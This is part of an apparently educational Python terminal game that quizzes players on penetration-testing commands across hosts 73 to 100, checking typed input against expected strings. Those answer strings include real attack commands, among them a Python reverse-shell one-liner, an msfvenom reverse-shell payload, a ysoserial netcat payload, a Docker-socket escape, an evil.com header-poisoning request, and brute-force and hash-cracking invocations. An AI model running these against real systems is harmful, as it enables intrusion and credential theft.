        print("Your task is to enumerate S3 buckets.")
        print(Fore.YELLOW + "Hint: Use a tool like 'aws s3 ls'." + Style.RESET_ALL)
        cmd1 = "aws s3 ls s3://target-bucket"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: S3 bucket enumerated. Sensitive files found." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 73: Man-in-the-Middle (MITM) Attacks
def host_seventy_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 73: Man-in-the-Middle (MITM) Attacks" + Style.RESET_ALL)
        print("Your task is to perform a MITM attack.")
        print(Fore.YELLOW + "Hint: Use a tool like Ettercap or ARP poisoning." + Style.RESET_ALL)
        cmd1 = "ettercap -T -i eth0 -M arp:remote /192.168.1.73//"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: MITM attack successful. Data captured." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 74: Clickjacking
def host_seventy_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 74: Clickjacking" + Style.RESET_ALL)
        print("Your task is to exploit a Clickjacking vulnerability.")
        print(Fore.YELLOW + "Hint: Craft an HTML page to embed the target site." + Style.RESET_ALL)
        cmd1 = "nano clickjacking.html"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Clickjacking attack successful. User action hijacked." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 75: Reverse Engineering
def host_seventy_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 75: Reverse Engineering" + Style.RESET_ALL)
        print("Your task is to reverse engineer a binary to find a hidden flag.")
        print(Fore.YELLOW + "Hint: Use a tool like Ghidra or IDA Pro." + Style.RESET_ALL)
        cmd1 = "ghidra"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Flag found in binary. Reverse engineering successful." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 76: Exploiting Weak Cryptography
def host_seventy_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 76: Exploiting Weak Cryptography" + Style.RESET_ALL)
        print("Your task is to crack weak encryption.")
        print(Fore.YELLOW + "Hint: Use a tool like John the Ripper or hashcat." + Style.RESET_ALL)
        cmd1 = "john --wordlist=rockyou.txt hash.txt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Hash cracked! Password is 'password123'." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 77: API Abuse
def host_seventy_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 77: API Abuse" + Style.RESET_ALL)
        print("Your task is to abuse insecure API endpoints.")
        print(Fore.YELLOW + "Hint: Use Postman or curl to manipulate API requests." + Style.RESET_ALL)
        cmd1 = "curl -X POST 'http://192.168.1.77/api/users' -d 'admin=true'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: API abused successfully. Admin access gained." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 78: Privilege Escalation via Sudo
def host_seventy_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 78: Privilege Escalation via Sudo" + Style.RESET_ALL)
        print("Your task is to exploit a misconfigured sudo permission.")
        print(Fore.YELLOW + "Hint: Use 'sudo -l' to list allowed commands." + Style.RESET_ALL)
        cmd1 = "sudo -u root /bin/sh"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Privilege escalated to root." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 79: Docker Container Escapes
def host_seventy_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 79: Docker Container Escapes" + Style.RESET_ALL)
        print("Your task is to escape from a Docker container.")
        print(Fore.YELLOW + "Hint: Exploit the Docker socket or misconfigured permissions." + Style.RESET_ALL)
        cmd1 = "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Escaped from Docker container. Host system accessed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 80: Server Misconfigurations
def host_eighty():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 80: Server Misconfigurations" + Style.RESET_ALL)
        print("Your task is to exploit a server misconfiguration.")
        print(Fore.YELLOW + "Hint: Check for exposed config files or directories." + Style.RESET_ALL)
        cmd1 = "curl 'http://192.168.1.80/.env'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Server misconfiguration exploited. Sensitive data accessed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 81: Side-Channel Attacks
def host_eighty_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 81: Side-Channel Attacks" + Style.RESET_ALL)
        print("Your task is to perform a timing attack to leak data.")
        print(Fore.YELLOW + "Hint: Observe response times and make educated guesses." + Style.RESET_ALL)
        cmd1 = "python3 timing_attack.py"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Timing attack successful. Data leaked." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 82: Jailbreaking/Rooting Devices
def host_eighty_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 82: Jailbreaking/Rooting Devices" + Style.RESET_ALL)
        print("Your task is to jailbreak a test iOS device.")
        print(Fore.YELLOW + "Hint: Use a tool like unc0ver or checkra1n." + Style.RESET_ALL)
        cmd1 = "checkra1n -c"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: iOS device jailbroken successfully." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 83: Packet Crafting
def host_eighty_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 83: Packet Crafting" + Style.RESET_ALL)
        print("Your task is to craft packets to exploit a vulnerability.")
        print(Fore.YELLOW + "Hint: Use a tool like Scapy." + Style.RESET_ALL)
        cmd1 = "scapy"
        cmd2 = "send(IP(dst='192.168.1.83')/ICMP())"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input(">>> ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Packets crafted and sent. Vulnerability exploited." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 84: Web Cache Poisoning
def host_eighty_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 84: Web Cache Poisoning" + Style.RESET_ALL)
        print("Your task is to poison the web cache to serve malicious content.")
        print(Fore.YELLOW + "Hint: Manipulate HTTP headers." + Style.RESET_ALL)
        cmd1 = "curl -H 'X-Forwarded-Host: evil.com' http://192.168.1.84"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Web cache poisoned. Malicious content served." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 85: DLL Hijacking
def host_eighty_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 85: DLL Hijacking" + Style.RESET_ALL)
        print("Your task is to exploit a DLL hijacking vulnerability.")
        print(Fore.YELLOW + "Hint: Place a malicious DLL in the application directory." + Style.RESET_ALL)
        cmd1 = "cp evil.dll /path/to/app/"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: DLL hijacking successful. Code executed." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 86: Web Shell Upload
def host_eighty_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 86: Web Shell Upload" + Style.RESET_ALL)
        print("Your task is to upload a web shell.")
        print(Fore.YELLOW + "Hint: Use Burp Suite to intercept the request and modify it." + Style.RESET_ALL)
        cmd1 = "nc 192.168.1.86 4444"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Web shell uploaded and connected." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 87: DNS Rebinding Attack
def host_eighty_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 87: DNS Rebinding Attack" + Style.RESET_ALL)
        print("Your task is to perform a DNS rebinding attack.")
        print(Fore.YELLOW + "Hint: Use dnsmasq to manipulate DNS responses." + Style.RESET_ALL)
        cmd1 = "dnsmasq --address=/target/192.168.1.87"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: DNS rebinding successful. Target compromised." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 88: Insecure Deserialization
def host_eighty_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 88: Insecure Deserialization" + Style.RESET_ALL)
        print("Your task is to exploit insecure deserialization.")
        print(Fore.YELLOW + "Hint: Generate a serialized payload using ysoserial." + Style.RESET_ALL)
        cmd1 = "ysoserial -g CommonsCollections5 -o raw 'nc 192.168.1.88 4444'"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Deserialization successful. Reverse shell obtained." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 89: Subdomain Takeover
def host_eighty_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 89: Subdomain Takeover" + Style.RESET_ALL)
        print("Your task is to perform a subdomain takeover.")
        print(Fore.YELLOW + "Hint: Use a tool like subjack to check for vulnerable subdomains." + Style.RESET_ALL)
        cmd1 = "subjack -w subdomains.txt -t 100 -o results.txt -ssl"
        user_input = input("kali@try-harder:~$ ")
        if user_input.strip() == cmd1:
            print(Fore.GREEN + "Output: Subdomain takeover successful. Pointed to your server." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 90: Kerberoasting
def host_ninety():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 90: Kerberoasting" + Style.RESET_ALL)
        print("Your task is to perform a Kerberoasting attack.")
        print(Fore.YELLOW + "Hint: Request a service ticket and crack it offline." + Style.RESET_ALL)
        cmd1 = "GetUserSPNs.py DOMAIN/username -request"
        cmd2 = "john --wordlist=rockyou.txt hash.txt"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Kerberoasting successful. Credentials obtained." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 91: Bypassing Network Segmentation
def host_ninety_one():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 91: Bypassing Network Segmentation" + Style.RESET_ALL)
        print("Your task is to bypass network segmentation to reach a target.")
        print(Fore.YELLOW + "Hint: You'll need to pivot through multiple hosts." + Style.RESET_ALL)
        cmd1 = "ssh user@192.168.1.91 -L 8080:192.168.1.100:80"
        cmd2 = "curl http://localhost:8080"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Network segmentation bypassed. Target reached." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 92: Advanced SQL Injection (Time-Based Blind)
def host_ninety_two():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 92: Advanced SQL Injection (Time-Based Blind)" + Style.RESET_ALL)
        print("Your task is to perform a Time-Based Blind SQL Injection.")
        print(Fore.YELLOW + "Hint: Use a tool like sqlmap with custom tampering scripts." + Style.RESET_ALL)
        cmd1 = "sqlmap -u http://192.168.1.92/login.php --data='user=*&pass=*' --level=5 --risk=3 --tamper=space2comment"
        cmd2 = "--dbs"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("sqlmap> ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Time-Based Blind SQL Injection successful. Databases enumerated." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 93: Cracking Password Hashes (Advanced)
def host_ninety_three():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 93: Cracking Password Hashes (Advanced)" + Style.RESET_ALL)
        print("Your task is to crack an Argon2 hash.")
        print(Fore.YELLOW + "Hint: Use John the Ripper with a powerful wordlist and rules." + Style.RESET_ALL)
        cmd1 = "john --wordlist=rockyou.txt --rules=Jumbo hash.txt"
        cmd2 = "--show"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Argon2 hash cracked. Password obtained." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 94: Social Engineering Toolkit (SET) Advanced
def host_ninety_four():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 94: Social Engineering Toolkit (SET) Advanced" + Style.RESET_ALL)
        print("Your task is to clone a website and harvest credentials.")
        print(Fore.YELLOW + "Hint: Use the Social Engineering Toolkit (SET)." + Style.RESET_ALL)
        cmd1 = "setoolkit"
        cmd2 = "1"
        cmd3 = "2"
        cmd4 = "3"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("set> ")
        user_input3 = input("set> ")
        user_input4 = input("set> ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2 and user_input3.strip() == cmd3 and user_input4.strip() == cmd4:
            print(Fore.GREEN + "Output: Website cloned. Credentials harvested." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 95: Advanced Malware Analysis
def host_ninety_five():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 95: Advanced Malware Analysis" + Style.RESET_ALL)
        print("Your task is to perform a dynamic analysis of a malware sample.")
        print(Fore.YELLOW + "Hint: Use tools like Wireshark and Process Monitor in a sandboxed environment." + Style.RESET_ALL)
        cmd1 = "wireshark -i eth0"
        cmd2 = "procmon"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: Dynamic analysis complete. Malware behavior documented." + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)
# Host 96: Capture the Flag (CTF) 1
def host_ninety_six():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 96: Capture the Flag (CTF) 1" + Style.RESET_ALL)
        print("Your task is to capture the flag on this box through a multi-stage attack.")
        print(Fore.YELLOW + "Hint: Enumeration is key. Start with a full port scan." + Style.RESET_ALL)
        cmd1 = "nmap -p- 192.168.1.96"
        cmd2 = "gobuster dir -u http://192.168.1.96 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
        cmd3 = "nc 192.168.1.96 4444"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        user_input3 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2 and user_input3.strip() == cmd3:
            print(Fore.GREEN + "Output: Flag captured! Well done!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 97: Capture the Flag (CTF) 2
def host_ninety_seven():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 97: Capture the Flag (CTF) 2" + Style.RESET_ALL)
        print("Your task is to capture the flag using a variety of advanced techniques.")
        print(Fore.YELLOW + "Hint: Start with exploiting an SQL injection to gain initial access." + Style.RESET_ALL)
        cmd1 = "sqlmap -u http://192.168.1.97/login.php --data='user=*&pass=*' --dbs"
        cmd2 = "searchsploit linux kernel 4.4"
        cmd3 = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.98 LPORT=4444 -f elf > shell.elf"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        user_input3 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2 and user_input3.strip() == cmd3:
            print(Fore.GREEN + "Output: Flag captured! Excellent job!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 98: Capture the Flag (CTF) 3
def host_ninety_eight():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 98: Capture the Flag (CTF) 3" + Style.RESET_ALL)
        print("Your task is to capture the flag using an advanced chained exploit.")
        print(Fore.YELLOW + "Hint: Enumerate the web application for vulnerabilities." + Style.RESET_ALL)
        cmd1 = "nikto -host 192.168.1.98"
        cmd2 = "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.98 http-post-form '/login.php:username=^USER^&password=^PASS^:Login Failed'"
        cmd3 = "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.98; set LPORT 4444; run'"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        user_input3 = input("msf5 > ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2 and user_input3.strip() == cmd3:
            print(Fore.GREEN + "Output: Flag captured! You're a pro!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 99: Capture the Flag (CTF) 4
def host_ninety_nine():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "Host 99: Capture the Flag (CTF) 4" + Style.RESET_ALL)
        print("Your task is to capture the flag using a combination of client-side and server-side exploits.")
        print(Fore.YELLOW + "Hint: Be wary of client-side security controls." + Style.RESET_ALL)
        cmd1 = "beef-xss"
        cmd2 = "nc -lvnp 4444"
        cmd3 = "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.99\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        user_input1 = input("kali@try-harder:~$ ")
        user_input2 = input("kali@try-harder:~$ ")
        user_input3 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1 and user_input2.strip() == cmd2 and user_input3.strip() == cmd3:
            print(Fore.GREEN + "Output: Flag captured! You're unstoppable!" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder" + Style.RESET_ALL)

# Host 100: Capture the Flag (CTF) Grand Finale (Enhanced)
def host_one_hundred():
    global points
    print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
    while True:
        print(Fore.GREEN + "\\n--- Welcome to the Grand Finale CTF! ---" + Style.RESET_ALL)
        print(Fore.YELLOW + "You've received a contract to perform a red team engagement against the target organization.\\nThis is the final test of your skills. Let's do this!\\n" + Style.RESET_ALL)
        
        # Step 1: Initial Enumeration
        print(Fore.CYAN + "\\nPhase 1: Initial Enumeration" + Style.RESET_ALL)
        print("Start by performing a basic scan to identify open ports on the target host.")
        cmd1 = "nmap -sS 192.168.1.100"
        user_input1 = input("kali@try-harder:~$ ")
        if user_input1.strip() == cmd1:
            print(Fore.GREEN + "Output: Port 22 and 80 are open.\\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder\\n" + Style.RESET_ALL)
            continue
        
        # Step 2: Web Enumeration
        print(Fore.CYAN + "\\nPhase 2: Web Enumeration" + Style.RESET_ALL)
        print("The target has a web server running. Let's enumerate directories to find potential vulnerabilities.")
        cmd2 = "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
        user_input2 = input("kali@try-harder:~$ ")
        if user_input2.strip() == cmd2:
            print(Fore.GREEN + "Output: /admin and /login found.\\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder\\n" + Style.RESET_ALL)
            continue
        
        # Step 3: SSH Tunneling (Pivoting)
        print(Fore.CYAN + "\\nPhase 3: SSH Tunneling (Pivoting)" + Style.RESET_ALL)
        print("The organization has a firewall that blocks direct access to internal hosts. Create an SSH tunnel to pivot.")
        cmd3 = "ssh -L 8080:192.168.1.101:80 user@192.168.1.100"
        user_input3 = input("kali@try-harder:~$ ")
        if user_input3.strip() == cmd3:
            print(Fore.GREEN + "Output: SSH tunnel established. You can now access 192.168.1.101 through localhost:8080.\\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "Try Harder\\n" + Style.RESET_ALL)
            continue

        # ... (Additional steps can be added here for further immersion)
        
        # Final Step: Capture The Flag
        print(Fore.CYAN + "\\nFinal Phase: Capture The Flag" + Style.RESET_ALL)
        print("You've reached the final challenge. Capture the flag to complete your mission!")
        cmd_final = "cat /root/flag.txt"
        user_input_final = input("kali@try-harder:~$ ")
        if user_input_final.strip() == cmd_final:
            print(Fore.GREEN + "Output: Congratulations! You've captured the flag and successfully completed the Grand Finale CTF!\\n" + Style.RESET_ALL)
            points += 1
            break
        else:
            print(Fore.RED + "Try Harder\\n" + Style.RESET_ALL)
            continue
def save_progress(current_level):
    with open("game_save.txt", "w") as f:
        f.write(str(current_level))
        print("saving game")
        f.close()

def load_progress():
    if os.path.exists("game_save.txt"):
        with open("game_save.txt", "r") as f:
            return int(f.read().strip())
    return 0

def reset_game():
    if os.path.exists("game_save.txt"):
        os.remove("game_save.txt")
        
# Main function to run the game
def main():
    # Initialize variables
    global points
    points = 0
    global current_level  # Access the global variable inside main()
    current_level = load_progress()  # Load progress at the beginning of the game

    host_functions = [
    host_one, host_two, host_three, host_four, host_five,
    host_six, host_seven, host_eight, host_nine, host_ten,
    host_eleven, host_twelve, host_thirteen, host_fourteen, host_fifteen,
    host_sixteen, host_seventeen, host_eighteen, host_nineteen, host_twenty,
    host_twenty_one, host_twenty_two, host_twenty_three, host_twenty_four, host_twenty_five,
    host_twenty_six, host_twenty_seven, host_twenty_eight, host_twenty_nine, host_thirty,
    host_thirty_one, host_thirty_two, host_thirty_three, host_thirty_four, host_thirty_five,
    host_thirty_six, host_thirty_seven, host_thirty_eight, host_thirty_nine, host_forty,
    host_forty_one, host_forty_two, host_forty_three, host_forty_four, host_forty_five,
    host_forty_six, host_forty_seven, host_forty_eight, host_forty_nine, host_fifty,
    host_fifty_one, host_fifty_two, host_fifty_three, host_fifty_four, host_fifty_five,
    host_fifty_six, host_fifty_seven, host_fifty_eight, host_fifty_nine, host_sixty,
    host_sixty_one, host_sixty_two, host_sixty_three, host_sixty_four, host_sixty_five,
    host_sixty_six, host_sixty_seven, host_sixty_eight, host_sixty_nine, host_seventy,
    host_seventy_one, host_seventy_two, host_seventy_three, host_seventy_four, host_seventy_five,
    host_seventy_six, host_seventy_seven, host_seventy_eight, host_seventy_nine, host_eighty,
    host_eighty_one, host_eighty_two, host_eighty_three, host_eighty_four, host_eighty_five,
    host_eighty_six, host_eighty_seven, host_eighty_eight, host_eighty_nine, host_ninety,
    host_ninety_one, host_ninety_two, host_ninety_three, host_ninety_four, host_ninety_five,
    host_ninety_six, host_ninety_seven, host_ninety_eight, host_ninety_nine, host_one_hundred
]

    display_title_screen()
    title_screen()

    # Load or initialize current_level
    current_level = load_progress()

    print(f"Current level: {current_level}, Number of hosts: {len(host_functions)}")

    while current_level < len(host_functions):
        print(f"Starting Level {current_level + 1}")
        
        # Execute the current host function
        host_functions[current_level]()
        # Move to the next level
        current_level += 1
        
        # Save progress
        print("Before saving progress.")
        save_progress(current_level)
        print("After saving progress.")

# Run the game
if __name__ == "__main__":
    main()
